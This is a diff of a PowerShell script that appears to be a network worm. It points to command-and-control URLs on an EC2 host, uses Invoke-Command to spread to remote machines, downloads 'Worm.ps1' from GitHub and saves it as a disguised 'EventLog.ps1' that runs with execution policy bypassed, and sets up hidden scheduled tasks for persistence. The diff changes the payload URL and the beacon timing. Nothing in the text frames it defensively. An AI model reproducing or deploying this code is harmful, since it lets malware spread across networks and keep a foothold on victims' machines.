@@ -6,7 +6,7 @@ else{
 }
 remove-item c:\Windows\EventLog.ps1
 [net.servicepointmanager]::SecurityProtocol = [net.securityprotocoltype]::Tls12
-import-module activedirectory
+
 set-executionpolicy Unrestricted -force
 $cNcURL='http://ec2-54-156-39-21.compute-1.amazonaws.com/f5423r/ctrlc/fffeeeezzzz/23retefd.txt'
 $timeURL='http://ec2-54-156-39-21.compute-1.amazonaws.com/eeee/timeZ.txt'
@@ -112,7 +112,7 @@ function wormy{
                         Invoke-Command -ScriptBlock {
                         set-executionpolicy Unrestricted
                         $WebClient = New-Object System.Net.WebClient
-                        $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1","C:\Windows\EventLog.ps1")
+                        $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/powW/main/Worm.ps1","C:\Windows\EventLog.ps1")
                         C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\EventLog.ps1' -ExecutionPolicy Bypass
                         }
                     }
@@ -120,7 +120,7 @@ function wormy{
                 else{
                         set-executionpolicy Unrestricted -force
                         $WebClient = New-Object System.Net.WebClient
-                        $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1","C:\Windows\EventLog.ps1")
+                        $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/powW/main/Worm.ps1","C:\Windows\EventLog.ps1")
                         C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\EventLog.ps1' -ExecutionPolicy Bypass   
                 }
                 }
@@ -184,7 +184,8 @@ start-job -scriptBlock {
 start-job -ScriptBlock { 
     while(1 -eq 1){
         try{ 
-        
+
+            
             $action = @()
             $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "invoke-restmethod https://raw.githubusercontent.com/Magrene/powW/main/Worm.ps1 | out-file -filepath c:\Windows\EventLog.ps1'
             $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "C:\Windows\EventLog.ps1"'
@@ -194,7 +195,7 @@ start-job -ScriptBlock {
         catch{
 
         }
-        start-sleep -Seconds (get-random -Minimum 2 -Maximum 5)
+        start-sleep -Seconds (get-random -Minimum 10 -Maximum 20)
     }
 }
 
